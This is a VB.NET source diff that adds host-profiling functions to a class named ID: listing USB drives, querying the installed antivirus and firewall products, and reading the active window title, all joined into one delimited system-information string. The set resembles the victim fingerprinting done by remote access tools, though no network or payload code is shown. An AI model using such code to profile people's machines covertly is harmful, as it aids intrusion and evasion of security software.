@@ -140,6 +140,21 @@ Public Class ID
         End Try
     End Function
 
+    Public Shared Function ListUSB()
+        Try
+            Dim sb As Text.StringBuilder = New Text.StringBuilder()
+            For Each drive In Environment.GetLogicalDrives
+                Dim Driver As IO.DriveInfo = New IO.DriveInfo(drive)
+                If Driver.DriveType = IO.DriveType.Removable Then
+                    sb.Append(drive.ToString + "  ")
+                End If
+            Next
+            Return sb.ToString
+        Catch ex As Exception
+            Return "Error"
+        End Try
+    End Function
+
     Public Shared Function GPU()
         Try
             Dim VideoCard As String = String.Empty
@@ -208,6 +223,23 @@ Public Class ID
         Try
             Dim str As String = Nothing
             Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
+            Dim instances As ManagementObjectCollection = searcher.[Get]()
+            For Each queryObj As ManagementObject In instances
+                str = queryObj("displayName").ToString()
+            Next
+            If str = String.Empty Then str = "N/A"
+            str = str.ToString
+            Return str
+            searcher.Dispose()
+        Catch
+            Return "N/A"
+        End Try
+    End Function
+
+    Public Shared Function FW() As String
+        Try
+            Dim str As String = Nothing
+            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM FirewallProduct")
             Dim instances As ManagementObjectCollection = searcher.[Get]()
             For Each queryObj As ManagementObject In instances
                 str = queryObj("displayName").ToString()
@@ -301,6 +333,37 @@ Public Class ID
         End Try
     End Function
 
+    Public Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr
+    Public Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
+    Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal WinTitle As String, ByVal MaxLength As Integer) As Integer
+    Public Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Integer
+
+    Public Shared Function ActiveWindow() As String
+        Try
+            Dim G As IntPtr = GetForegroundWindow()
+            If G = IntPtr.Zero Then
+                Return ""
+            End If
+            Dim W As Integer
+            W = GetWindowTextLength(G)
+            Dim STR As String = StrDup(W + 1, "*")
+            GetWindowText(G, STR, W + 1)
+            Dim PID As Integer
+            GetWindowThreadProcessId(G, PID)
+            If PID = 0 Then
+                Return STR
+            Else
+                Try
+                    Return Process.GetProcessById(PID).MainWindowTitle()
+                Catch ex As Exception
+                    Return STR
+                End Try
+            End If
+        Catch ex As Exception
+            Return ""
+        End Try
+    End Function
+
     Public Shared Function Getsystem() As String
         Try
             Return SystemInformation.ComputerName.ToString() & SPL &
@@ -322,7 +385,10 @@ Public Class ID
             MachineType() & SPL &
             DotNET() & SPL &
             ListDrivers() & SPL &
-            HWID() & SPL
+            HWID() & SPL &
+            ActiveWindow() & SPL &
+            FW() & SPL &
+            ListUSB() & SPL
         Catch
             Return "N/A"
         End Try
